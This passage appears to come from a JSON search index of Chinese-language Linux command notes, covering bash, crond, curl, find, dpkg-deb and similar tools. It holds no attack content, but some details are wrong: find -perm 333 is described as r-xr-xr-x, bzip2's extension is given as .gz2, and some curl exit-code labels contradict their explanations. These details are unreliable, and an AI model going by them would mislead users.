-c <command> 以非交互方式执行给定的命令, 即将内容作为脚本执行, 支持换行的文本 -e 如果命令返回非零退出状态，则立即退出脚本 -a 将命令添加到历史记录中，而不执行 -f 禁用文件名扩展（通配符） -i 交互式运行Shell -r 禁用反斜杠转义 -s 从标准输入读取命令而不从终端读取","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-bash.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-bash.html"},{"title":"bg","text":"让前台任务在后台执行. 使用 /docs/操作系统/linux/linux指令/jobs 查看后台运行的进程, 使第N个任务在后台运行（%前有空格）: bg %N 默认不带%N时表示对最后一个进程操作！","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-but.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-but.html"},{"title":"bzip2","text":"解压缩, 扩展名一般用.gz2 语法参数基本与 /docs/操作系统/linux/linux指令/gzip 一致 注解 tar命令中增加一个选项(-j)可以调用bzip2","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-bzip2.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-bzip2.html"},{"title":"cal","text":"查看当前日历, 默认只显示当前月份 -y 显示完整一年","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cal.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cal.html"},{"title":"chkconfig","text":"chkconfig是管理系统服务(service)的命令行工具。 所谓系统服务(service)，就是随系统启动而启动，随系统关闭而关闭的程序。 chkconfig可以更新(启动或停止)和查询系统服务(service)运行级信息。 更简单一点，chkconfig是一个用于维护/etc/rc[0-6].d目录的命令行工具。 常见用法 用法: chkconfig [--list] [--type <类型>] [名称] chkconfig --add <名称> chkconfig --del <名称> chkconfig --override <名称> chkconfig [--level <级别>] [--type <类型>] <名称> <on|off|reset|resetpriorities> 设置service开机是否启动: chkconfig name on/off/reset on、off、reset用于改变service的启动信息. on表示开启，off表示关闭，reset表示重置。 默认情况下，on和off开关只对运行级2，3，4，5有效，reset可以对所有运行级有效。 注解 在Redhat7上，运行chkconfig命令，都会被转到systemcle命令上。 设置service运行级别: chkconfig --level levels 指定服务的运行级别，即指定运行级别2,3,4,5等(即 init 的运行级别): 0：- 关机 1：单用户模式 2：无网络连接的多用户命令行模式 3：有网络连接的多用户命令行模式 4：不可用 5：带图形界面的多用户模式 6：重新启动 列出service启动信息: chkconfig --list [name] 如果不指定name，会列出所有services的信息. 每个service每个运行级别都会有一个启动和停止脚本； 当切换运行级别时，init不会重启已经启动的service，也不会重新停止已经停止的service。 欲查看对特定 target 启用的服务请执行: systemctl list-dependencies [target]","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chkconfig.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chkconfig.html"},{"title":"clear","text":"清屏 也可使用快捷键：Ctrl + l","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-clear.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-clear.html"},{"title":"convert","text":"转换图片格式，支持JPG, BMP, PCX, GIF, PNG, TIFF, XPM和XWD等类型 mac安装: brew install imagemagick 获取图片尺寸: identify ABCD.png 输出: ABCD.png PNG 339x362 339x362+0+0 8-bit DirectClass 76.2kb 说明：图片ABCD.png的格式为PNG，宽、高分别为339和362，位深度8-bit，大小76.2kb；下文主要涉及宽、高的信息。 将jpeg转成png文件: convert xxx.jpg xxx.png 将gif转换成bmp图像: convert xxx.gif xxx.bmp 将tiff转换成pcx图像: convert xxx.tiff xxx.pcx 将图像的像素改为1024*768，注意1024与768之间是小写字母x: convert -resize 1024x768 xxx.jpg xxx1.jpg 将图像的缩减为原来的50%*50%: convert -sample 50%x50% xxx.jpg xxx1.jpg 将图像顺时针旋转270度: convert -rotate 270 sky.jpg sky-final.jpg 使用-draw选项还可以在图像里面添加文字: convert -fill black -pointsize 60 -font helvetica -draw 'text 10,80 \"Hello, World!\" ‘ hello.jpg helloworld.jpg 在图像上加上文字说明, 比如版权: # 支持用 -font 指定字体，需要安装Ghostscript支持: http://www.cs.wisc.edu/~ghost/ # 或者用 composite 命令在所有图片上加上水印: http://www.imagemagick.org/script/composite.php convert 1.png -fill white -pointsize 13 -draw \"text 10,15 ‘lifesinger 2006＇\" 2.png 参考:: Linux之convert命令 巧用linux工具之convert简介","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-convert.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-convert.html"},{"title":"crond","text":"crontab服务 Linux下的任务调度分为两类： 系统任务调度 和 用户任务调度 系统任务调度 系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。 在 /etc 目录下有一个 crontab 文件，这个就是系统任务调度的配置文件。 /etc/crontab 文件包括下面几行: SHELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=\"\"HOME=/ # run-parts 51 * * * * root run-parts /etc/cron.hourly 24 7 * * * root run-parts /etc/cron.daily 22 4 * * 0 root run-parts /etc/cron.weekly 42 4 1 * * root run-parts /etc/cron.monthly 前四行是用来配置crond任务运行的环境变量 第一行SHELL变量指定了系统要使用哪个shell，这里是bash 第二行PATH变量指定了系统执行命令的路径 第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户， 如果MAILTO变量的值为空，则表示不发送任务执行信息给用户， 第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。 用户任务调度 用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。 用户可以使用 crontab 工具来定制自己的计划任务。 所有用户定义的crontab文件都被保存在 /var/spool/cron 目录中。 其文件名与用户名一致，使用者权限文件如下: /etc/cron.deny 该文件中所列用户不允许使用crontab命令 /etc/cron.allow 该文件中所列用户允许使用crontab命令 /var/spool/cron/ 所有用户crontab文件存放的目录,以用户名命名 crontab文件的含义 用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它 的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下: minute hour day month week command 顺序：分 时 日 月 周 其中： minute： 表示分钟，可以是从0到59之间的任何整数。 hour：表示小时，可以是从0到23之间的任何整数。 day：表示日期，可以是从1到31之间的任何整数。 month：表示月份，可以是从1到12之间的任何整数。 week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。 command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。 在以上各个字段中，还可以使用以下特殊字符： 星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。 逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，\"1,2,5,7,8,9\" 中杠（-）：可以用整数之间的中杠表示一个整数范围，例如\"2-6\"表示\"2,3,4,5,6\" 正斜线（/）：可以用正斜线指定时间的间隔频率，例如\"0-23/2\"表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。 crond服务-指令 常用: /sbin/service crond start # 启动服务 /sbin/service crond stop # 关闭服务 /sbin/service crond restart # 重启服务 /sbin/service crond reload # 重新载入配置 查看crontab服务状态: service crond status 手动启动crontab服务: service crond start 查看crontab服务是否已设置为开机启动，执行命令: ntsysv 加入开机自动启动: chkconfig –level 35 crond on centos版本适用 cron表达式中问号(?)的使用 cron表达式详解其中问号 ? 只能用在 DayofMonth 和 DayofWeek 两个域， 由于指定日期( DayofMonth )和指定星期( DayofWeek )存在冲突， 所以当指定了日期( DayofMonth )后（包括每天），星期( DayofWeek )必须使用 ? ， 同理，指定星期( DayofWeek )后，日期( DayofMonth )必须使用问号 ? .","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-crond.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-crond.html"},{"title":"curl","text":"curl 是常用的命令行工具，用来请求 Web 服务器。 它的名字就是客户端（client）的 URL 工具的意思。 它的功能非常强大，命令行参数多达几十种。如果熟练的话，完全可以取代 Postman 这一类的图形界面工具。 不带有任何参数时，curl 就是发出 GET 请求: $ curl https://www.example.com -A -A 参数指定客户端的用户代理标头，即 User-Agent . curl 的默认用户代理字符串是 curl/[version] 将 User-Agent 改成 Chrome 浏览器: $ curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' https://google.com 移除 User-Agent 标头: $ curl -A '' https://google.com 也可以通过 -H 参数直接指定标头，更改 User-Agent : $ curl -H 'User-Agent: php/1.0' https://google.com -b -b 参数用来向服务器发送 Cookie 生成一个标头`Cookie: foo=bar`，向服务器发送一个名为`foo`、值为`bar`的 Cookie: $ curl -b 'foo=bar' https://google.com 发送两个 Cookie: $ curl -b 'foo1=bar;foo2=bar2' https://google.com 读取本地文件`cookies.txt`，里面是服务器设置的 Cookie（参见`-c`参数），将其发送到服务器: $ curl -b cookies.txt https://www.google.com -c -c 参数将服务器设置的 Cookie 写入一个文件。 将服务器的 HTTP 回应所设置 Cookie 写入文本文件 cookies.txt : $ curl -c cookies.txt https://www.google.com -d -d 参数用于发送 POST 请求的数据体 使用`-d`参数以后，HTTP 请求会自动加上标头 Content-Type : application/x-www-form-urlencoded 。 并且会自动将请求转为 POST 方法，因此可以省略 -X POST : $ curl -d'login=emma＆password=123'-X POST https://google.com/login # 或者 $ curl -d 'login=emma' -d 'password=123' -X POST https://google.com/login -d 参数可以读取本地文本文件的数据，向服务器发送. 如读取`data.txt`文件的内容，作为数据体向服务器发送: $ curl -d '@data.txt' https://google.com/login --data-urlencode --data-urlencode 参数等同于 -d ，发送 POST 请求的数据体， 区别在于会自动将发送的数据进行 URL 编码。 发送的数据 hello world 之间有一个空格，需要进行 URL 编码: $ curl --data-urlencode 'comment=hello world' https://google.com/login -e 设置 HTTP 的标头 Referer ，表示请求的来源。 将`Referer`标头设为 https://google.com?q=example : curl -e 'https://google.com?q=example' https://www.example.com -H`参数可以通过直接添加标头`Referer ，达到同样效果: curl -H 'Referer: https://google.com?q=example' https://www.example.com -F 向服务器上传二进制文件 给 HTTP 请求加上标头`Content-Type: multipart/form-data`，然后将文件`photo.png`作为`file`字段上传: $ curl -F 'file=@photo.png' https://google.com/profile -F 参数可以指定 MIME 类型。 如指定 MIME 类型为`image/png`，否则 curl 会把 MIME 类型设为 application/octet-stream : $ curl -F 'file=@photo.png;type=image/png' https://google.com/profile -F`参数也可以指定文件名。 如原始文件名为`photo.png ，但是服务器接收到的文件名为 me.png : $ curl -F 'file=@photo.png;filename=me.png' https://google.com/profile -G 构造 URL 的查询字符串。 发出一个 GET 请求，实际请求的 URL 为`https://google.com/search?q=kitties&count=20`。如果省略`--G`，会发出一个 POST 请求: $ curl -G -d 'q=kitties' -d 'count=20' https://google.com/search 如果数据需要 URL 编码，可以结合 --data--urlencode 参数: $ curl -G --data-urlencode 'comment=hello world' https://www.example.com -H 添加 HTTP 请求的标头。 添加 HTTP 标头 Accept-Language: en-US : $ curl -H 'Accept-Language: en-US' https://google.com 添加两个 HTTP 标头: $ curl -H 'Accept-Language: en-US' -H 'Secret-Message: xyzzy' https://google.com 添加 HTTP 请求的标头是 Content-Type: application/json ，然后用`-d`参数发送 JSON 数据: $ curl -d '{\"login\": \"emma\", \"pass\": \"123\"}' -H 'Content-Type: application/json' https://google.com/login -i 打印出服务器回应的 HTTP 标头 收到服务器回应后，先输出服务器回应的标头，然后空一行，再输出网页的源码: $ curl -i https://www.example.com -I 向服务器发出 HEAD 请求，然会将服务器返回的 HTTP 标头打印出来。 输出服务器对 HEAD 请求的回应: $ curl -I https://www.example.com --head`参数等同于 `-I : $ curl --head https://www.example.com -k 指定跳过 SSL 检测。 不会检查服务器的 SSL 证书是否正确: $ curl -k https://www.example.com -L 让 HTTP 请求跟随服务器的重定向。 curl 默认不跟随重定向: $ curl -L -d 'tweet=hi' https://api.twitter.com/tweet --limit-rate --limit-rate 限制 HTTP 请求和回应的带宽，模拟慢网速的环境 将带宽限制在每秒 200K 字节: $ curl --limit-rate 200k https://google.com -o -o 参数将服务器的回应保存成文件，等同于 wget 命令 将 www.example.com 保存成 example.html : $ curl -o example.html https://www.example.com -O -O 参数将服务器回应保存成文件，并将 URL 的最后部分当作文件名。 将服务器回应保存成文件，文件名为 bar.html : $ curl -O https://www.example.com/foo/bar.html -s -s 参数将不输出错误和进度信息 一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果: $ curl -s https://www.example.com 如果想让 curl 不产生任何输出，可以使用下面的命令: $ curl -s -o /dev/null https://google.com -S -S`参数指定只输出错误信息，通常与 `-s 一起使用。 命令没有任何输出，除非发生错误: $ curl -s -o /dev/null https://google.com -u 设置服务器认证的用户名和密码。 设置用户名为 bob ，密码为 12345 ， 然后将其转为 HTTP 标头 Authorization: Basic Ym9iOjEyMzQ1 : $ curl -u 'bob:12345' https://google.com/login curl 能够识别 URL 里面的用户名和密码, 将其转为上个例子里面的 HTTP 标头: $ curl https://bob:12345@google.com/login 只设置了用户名，执行后，curl 会提示用户输入密码: $ curl -u 'bob' https://google.com/login -v 输出通信的整个过程，用于调试: $ curl -v https://www.example.com --trace 参数也可以用于调试，还会输出原始的二进制数据: $ curl --trace - https://www.example.com -x -x 参数指定 HTTP 请求的代理。 指定 HTTP 请求通过 myproxy.com:8080 的 socks5 代理发出: $ curl -x socks5://james:cats@myproxy.com:8080 https://www.example.com 如果没有指定代理协议，默认为 HTTP。 请求的代理使用 HTTP 协议: $ curl -x james:cats@myproxy.com:8080 https://www.example.com -X -X 参数指定 HTTP 请求的方法。 对 https://www.example.com 发出 POST 请求: $ curl -X POST https://www.example.com CURL状态码列表 状态码 状态原因 解释 0 正常访问 1 错误的协议 未支持的协议。此版cURL 不支持这一协议。 2 初始化代码失败 初始化失败。 3 URL格式不正确 URL 格式错误。语法不正确。 4 请求协议错误 5 无法解析代理 无法解析代理。无法解析给定代理主机。 6 无法解析主机地址 无法解析主机。无法解析给定的远程主机。 7 无法连接到主机 无法连接到主机。 8 远程服务器不可用 FTP 非正常的服务器应答。cURL 无法解析服务器发送的数据。 9 访问资源错误 FTP 访问被拒绝。服务器拒绝登入或无法获取您想要的特定资源或目录。最有可 能的是您试图进入一个在此服务器上不存在的目录。 11 FTP密码错误 FTP 非正常的PASS 回复。cURL 无法解析发送到PASS 请求的应答。 13 结果错误 FTP 非正常的的PASV 应答，cURL 无法解析发送到PASV 请求的应答。 14 FTP回应PASV命令 FTP 非正常的227格式。cURL 无法解析服务器发送的227行。 15 内部故障 FTP 无法连接到主机。无法解析在227行中获取的主机IP。 17 设置传输模式为二进制 FTP 无法设定为二进制传输。无法改变传输方式到二进制。 18 文件传输短或大于预期 部分文件。只有部分文件被传输。 19 RETR命令传输完成 FTP 不能下载/访问给定的文件， RETR (或类似)命令失败。 21 命令成功完成 FTP quote 错误。quote 命令从服务器返回错误。 22 返回正常 HTTP 找不到网页。找不到所请求的URL 或返回另一个HTTP 400或以上错误。 此返回代码只出现在使用了-f/--fail 选项以后。 23 数据写入失败 写入错误。cURL 无法向本地文件系统或类似目的写入数据。 25 无法启动上传 FTP 无法STOR 文件。服务器拒绝了用于FTP 上传的STOR 操作。 26 回调错误 读错误。各类读取问题。 27 内存分配请求失败 内存不足。内存分配请求失败。 28 访问超时 操作超时。到达指定的超时期限条件。 30 FTP端口错误 FTP PORT 失败。PORT 命令失败。并非所有的FTP 服务器支持PORT 命令，请 尝试使用被动(PASV)传输代替！ 31 FTP错误 FTP 无法使用REST 命令。REST 命令失败。此命令用来恢复的FTP 传输。 33 不支持请求 HTTP range 错误。range \"命令\"不起作用。 34 内部发生错误 HTTP POST 错误。内部POST 请求产生错误。 35 SSL/TLS握手失败 SSL 连接错误。SSL 握手失败。 36 下载无法恢复 FTP 续传损坏。不能继续早些时候被中止的下载。 37 文件权限错误 文件无法读取。无法打开文件。权限问题？ 38 LDAP可没有约束力 LDAP 无法绑定。LDAP 绑定(bind)操作失败。 39 LDAP搜索失败 LDAP 搜索失败。 41 函数没有找到 功能无法找到。无法找到必要的LDAP 功能。 42 中止的回调 由回调终止。应用程序告知cURL 终止运作。 43 内部错误 内部错误。由一个不正确参数调用了功能。 45 接口错误 接口错误。指定的外发接口无法使用。 47 过多的重定向 过多的重定向。cURL 达到了跟随重定向设定的最大限额跟 48 无法识别选项 指定了未知TELNET 选项。 49 TELNET格式错误 不合式的telnet 选项。 51 远程服务器的SSL证书 peer 的SSL 证书或SSH 的MD5指纹没有确定。 52 服务器无返回内容 服务器无任何应答，该情况在此处被认为是一个错误。 53 加密引擎未找到 找不到SSL 加密引擎。 54 设定默认SSL加密失败 无法将SSL 加密引擎设置为默认。 55 无法发送网络数据 发送网络数据失败。 56 衰竭接收网络数据 在接收网络数据时失败。 57 58 本地客户端证书 本地证书有问题。 59 无法使用密码 无法使用指定的SSL 密码。 60 凭证无法验证 peer 证书无法被已知的CA 证书验证。 61 无法识别的传输编码 无法辨识的传输编码。 62 无效的LDAP URL 无效的LDAP URL。 63 文件超过最大大小 超过最大文件尺寸。 64 FTP失败 要求的FTP 的SSL 水平失败。 65 倒带操作失败 发送此数据需要的回卷(rewind)失败。 66 SSL引擎失败 初始化SSL 引擎失败。 67 服务器拒绝登录 用户名、密码或类似的信息未被接受，cURL 登录失败。 68 未找到文件 在TFTP 服务器上找不到文件。 69 无权限 TFTP 服务器权限有问题。 70 超出服务器磁盘空间 TFTP 服务器磁盘空间不足。 71 非法TFTP操作 非法的TFTP 操作。 72 未知TFTP传输的ID 未知TFTP 传输编号(ID)。 73 文件已经存在 文件已存在(TFTP) 。 74 错误TFTP服务器 无此用户(TFTP) 。 75 字符转换失败 字符转换失败。 76 必须记录回调 需要字符转换功能。 77 CA证书权限 读SSL 证书出现问题(路径？访问权限？ ) 。 78 URL中引用资源不存在 URL 中引用的资源不存在。 79 错误发生在SSH会话 SSH 会话期间发生一个未知错误。 80 无法关闭SSL连接 未能关闭SSL 连接。 81 服务未准备 82 无法载入CRL文件 无法加载CRL 文件，丢失或格式不正确(在7.19.0版中增加) 。 83 发行人检查失败 签发检查失败(在7.19.0版中增加) 。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-curl.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-curl.html"},{"title":"cut","text":"显示行中的指定部分，删除文件中指定字段。 语法: cut（选项）（参数） 选项 -b 仅显示行中指定直接范围的 字节 内容； -c 仅显示行中指定范围的 字符 ； -d 指定字段的分隔符，默认的字段分隔符为\"TAB\"； -f 显示指定 字段 （指定列）的内容； -n 与\"-b\"选项连用，不分割多字节字符； --complement 补足被选择的字节、字符或字段； --out-delimiter= <字段分隔符> 指定输出内容是的字段分割符； 字节字符如何写参数 N-：从第N个字节、字符、字段到结尾； N-M：从第N个字节、字符、字段到第M个（包括M在内）字节、字符、字段； -M：从第1个字节、字符、字段到第M个（包括M在内）字节、字符、字段。 例-从文件中提取第三列并打印: cut -f3 file.txt 支持多列, 如第3, 4列打印: cut -f3,4 file.txt cut命令默认使用制表符作为字段分隔符。 如果您的数据使用其他分隔符，例如逗号或空格，您可以使用 -d 选项指定分隔符。 例如，对于以逗号分隔的数据，您可以使用以下命令: cut -d',' -f3 file.csv 注解 在MacOS上(其他系统不确定), 对于连续空格识别有点问题, 如: echo \"mysql <none> 57da161f45ac 12 months ago 517MB\" | cut -f3 的结果是打印整个行; 而: echo \"mysql <none> 57da161f45ac 12 months ago 517MB\" | cut -d ' ' -f3 的输出是空; 只有这样的才能正常处理: $ echo \"mysql <none> 57da161f45ac 12 months ago 517MB\" | cut -d ' ' -f3 57da161f45ac 不知道是不是tab识别有问题...","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cut.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-cut.html"},{"title":"dpkg-deb","text":"dpkg-deb 提供了完整的 deb 包创建和操作功能, 提供打包、解包、查询 deb 信息等功能 是 deb 包管理不可或缺的工具 常见用法和选项包括: 解包 deb: dpkg-deb -x package.deb unpack/ :解压 deb 到指定目录 dpkg-deb -R package.deb unpack/ :递归解压 deb 及数据到指定目录 打包 deb: dpkg-deb -b directory package.deb :将目录打包生成 deb 文件 dpkg-deb -Z gzip -b dir package.deb :打包时使用 gzip 压缩 查看信息: dpkg-deb -I package.deb :显示 deb 的详细信息 dpkg-deb -c package.deb :列出 deb 中的文件列表 dpkg-deb -f package.deb :显示打包文件名 验证: dpkg-deb -W package.deb:验证 deb 文件的完整性 控制字段: --field=Field:Name :设置指定控制字段为 Name --field=Field: :删除指定控制字段 解压使用-x与-R区别 使用 -x解压的vscode包没有 DEBIAN目录, 使用 -R解压的有 解包行为略有不同: -x 选项进行解包时,只会解压 deb 包中的 data.tar.* 文件,也就是软件的实际文件。 而 -R 选项解包时,不仅会解压 data.tar. ,还会额外解压 control.tar. 文件。 control.tar.* 中包含了 deb 包的控制信息,其中就包括 /DEBIAN 目录和 control 等文件。 这主要是因为在多数情况下,我们解包只是为了获取软件文件本身,而不需要控制信息。 所以 -x 提供了更简单的解包方式。 但在需要完整解压调试 deb 包内部结构时,-R 解包则可以提供完整的内容。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-dpkg-deb.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-dpkg-deb.html"},{"title":"expr","text":"手工命令行计数器，用于在UNIX/LINUX下求表达式变量的值，一般用于整数值，也可用于字符串。 语法: expr 表达式 表达式说明: 用空格隔开每个项； 用反斜杠 放在 shell 特定的字符前面； 对包含空格和其他特殊字符的字符串要用引号括起来 例 计算字串长度: > expr length \"this is a test\" 14 抓取字串: > expr substr \"this is a test\" 3 5 is is 抓取第一个字符数字串出现的位置: > expr index \"sarasara\" a 2 整数运算: > expr 14 % 9 5 > expr 10 + 10 20 > expr 1000 + 900 1900 > expr 30 / 3 / 2 5 > expr 30 \\* 3 (使用乘号时，必须用反斜线屏蔽其特定含义。因为shell可能会误解显示星号的意义) 90 > expr 30 * 3 expr: Syntax error 补充 等价: ((i=$j+$k)) 等价于 i=`expr $j + $k` ((i=$j-$k)) 等价于 i=`expr $j -$k` ((i=$j*$k)) 等价于 i=`expr $j \\*$k` ((i=$j/$k)) 等价于 i=`expr $j /$k` Let expressions 执行一个或多个表达式。表达式中的变量前不必有$.如果表达式中包含了空格或其他特殊字符，则必须引起来。 例: let \"I = I + 1\" 或 let i=i+1","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exprr.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-exprr.html"},{"title":"file","text":"辨识文件类型 语法: file [-bcLvz][-f <名称文件>][-m <魔法数字文件>...][文件或目录...] 选项参数 常用: -b 列出辨识结果时，不显示文件名称。 -c 详细显示指令执行过程，便于排错或分析程序执行的情形。 -f<名称文件> 指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。 -L 直接显示符号连接所指向的文件的类别。 -m<魔法数字文件> 指定魔法数字文件。 -v 显示版本信息。 -z 尝试去解读压缩文件的内容。 [文件或目录...] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。 所有 --help display this help and exit -v , --version output version information and exit -m , --magic-file LIST use LIST as a colon-separated list of magic number files -M LIST use LIST as a colon-separated list of magic number files in place of default LIST use LIST as a colon-separated list of magic number files in place of default -z , --uncompress try to look inside compressed files -Z , --uncompress-noreport only print the contents of compressed files -b , --brief do not prepend filenames to output lines -c , --checking-printout print the parsed form of the magic file, use in conjunction with -m to debug a new magic file before installing it -d use default magic file use default magic file -e , --exclude TEST exclude TEST from the list of test to be performed for file. Valid tests are: apptype, ascii, cdf, compress, csv, elf, encoding, soft, tar, json, text, tokens --exclude-quiet TEST like exclude, but ignore unknown tests -f , --files-from FILE read the filenames to be examined from FILE -F , --separator STRING use string as separator instead of : -i do not further classify regular files do not further classify regular files -I , --mime output MIME type strings (--mime-type and --mime-encoding) --extension output a slash-separated list of extensions --mime-type output the MIME type --mime-encoding output the MIME encoding -k , --keep-going don't stop at the first match -l , --list list magic strength -L , --dereference follow symlinks -h , --no-dereference don't follow symlinks (default) -n , --no-buffer do not buffer output -N , --no-pad do not pad output -0 , --print0 terminate filenames with ASCII NUL -p , --preserve-date preserve access times on files -P , --parameter set file engine parameter limits bytes 1048576 max bytes to look inside file elf_notes 256 max ELF notes processed elf_phnum 2048 max ELF prog sections processed elf_shnum 32768 max ELF sections processed encoding 65536 max bytes to scan for encoding indir 50 recursion limit for indirection name 60 use limit for name/use magic regex 8192 length limit for REGEX searches -r , --raw don't translate unprintable chars to ooo -s , --special-files treat special (block/char devices) files as ordinary ones -S , --no-sandbox disable system call sandboxing -C , --compile compile file specified by -m -D , --debug print debugging messages 用例 查看文件相关信息: yanque@yanquedembp Downloads % file * $RECYCLE.BIN: directory movie: directory mushenji2.txt: Non-ISO extended-ASCII text, with very long lines (638), with CRLF line terminators 查看文件编码: yanque@yanquedembp Downloads % file --mime-encoding * $RECYCLE.BIN: binary movie: binary mushenji2.txt: unknown-8bit mushenji.txt: utf-8","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-file.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-file.html"},{"title":"find","text":"在指定目录下查找文件。 任何位于参数之前的字符串都将被视为欲查找的目录名。 如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。 语法: find path -option [ -print ] [ -exec -ok command ] {} \\; find 根据下列规则判断 path 和 expression，在命令列上第一个 - ( ) , ! 之前的部份为 path，之后的是 expression。如果 path 是空字串则使用目前路径，如果 expression 是空字串则使用 -print 为预设 expression。 expression 中可使用的选项有二三十个之多，在此只介绍最常用的部份。 匹配方式 -mount, -xdev 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件 -amin n 在过去 n 分钟内被读取过 -anewer file 比文件 file 更晚被读取过的文件 -atime n 在过去 n 天内被读取过的文件 -cmin n 在过去 n 分钟内被修改过 -cnewer file 比文件 file 更新的文件 -ctime n 在过去 n 天内创建的文件 -mtime n 在过去 n 天内修改过的文件. n为数字，表示n天之前的【一天之内】被改动过的文件 -empty 空的文件-gid n or -group name, gid 是 n 或是 group 名称是 name -ipath p, -path p 路径名称符合 p 的文件，ipath 会忽略大小写 -name name, -iname name 文件名称符合 name 的文件。iname 会忽略大小写 -size n 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数(字节)，k 表示 kilo bytes(kb)，w 是二个位元组, M(Mb), G(Gb), 可与 + - 搭配使用。 -type c 文件类型是 c 的文件. 支持参数, d 目录, c 字型装置文件, b 区块装置文件, p 具名贮列, f 一般文件, l 符号连结, s socket -pid n process id 是 n 的文件 -inum n 指定 inodenum 为n -newer file file作为一个存在的文件，列出比file更新的文件 -user user 文件属主为user -group group 文件属组为group -perm 文件权限 -maxdepth 递归查找层数 -delete 对于所有检索到的项目进行删除操作 -exec 执行指定命令 -samefile 查看有哪些相同的文件, 比如当你知道一个文件, 想知道它有被哪些链接了 你可以使用 ( ) 将运算式分隔，并使用下列运算: exp1 -and exp2 ! expr -not expr exp1 -or exp2 exp1, exp2 # -and 等价于 -a # -or 等价于 -o 如检索 /usr 下文件名以 python 开头且类型为目录的文件: find /usr -type d -name 'python*' 该命令等同于: find /usr -type d -a -name 'python*' 更复杂的组合形式如: find / '(' -mmin -5 -o -mtime +50 ')' -a -type f 选项详解 mtime 文件修改时间: -mtime n : 在过去 n 天内修改过的文件. n为数字，表示n天之前的【一天之内】被改动过的文件 -mtime +n : 列出n天之前被改动过的文件【不包含n天】 -mtime -n : 列出n天之后被改动过的文件【包含n天】 type 文件类型: -type d 目录 -type c 字型装置文件 -type b 区块装置文件 -type p 具名贮列 -type f 一般文件 -type l 符号连结 -type s socket size 文件大小(对于目录来说没有意义): c 字节 k kb M Mb G Gb 可与 +, - 搭配使用, 如检索文件大小高于 1 GB 的文件: find / -size +1G perm 文件权限 如搜索 /usr 目录下所有权限为 r-xr-xr-x（即系统中的所有用户都只有读写权限）的文件和目录， 可以使用以下命令: find /usr -perm a=rx 或者: find /usr -perm u=rx,g=rx,o=rx 亦可直接使用数字的形式: find /usr -perm 333 若仅需要匹配某一个字集: # /a=x 中的 / 表示仅匹配权限子集. 即只要有执行权限即可. find /usr -perm /a=x maxdepth find默认是递归检索项目的, 可使用 -maxdepth 限制递归查找层数. 如搜索时向下递归的层数最大为 3: find / -maxdepth 3 exec 执行自定义命令 如将 home 目录下所有的 py 文件复制到 bak 目录下: find ~ -type f -name '*.py' -exec cp {} bak ';' 其中的大括号（{}）作为检索到的文件的 占位符 ，而分号作为命令结束的标志。因为分号是 Shell 中有特殊含义的符号，所以需要使用单引号括起来, 或者用 \\ 也可。 +的作用 多文件打包: # + 表示多个文件都一起打包在此处, 否则最终压缩包内只有一个py文件 find ~ -type f -name '*.py' -exec tar -czvf py_file.tar.gz {} +","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-find.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-find.html"},{"title":"fuser","text":"安装: apt install psmisc 显示出当前哪个程序在使用磁盘上的某个文件、挂载点、甚至网络端口，并给出程序进程的详细信息 语法: fuser(选项)(参数) 访问类型: - c：代表当前目录 - e：将此文件作为程序的可执行对象使用 - f：打开的文件。默认不显示。 - F：打开的文件，用于写操作。默认不显示。 - r：指示该目录为进程的根目录 - m：指示进程使用该文件进行内存映射，抑或该文件为共享库文件，被进程映射进内存 - s：将此文件作为共享库（或其他可装载对象）使用 常用选项: 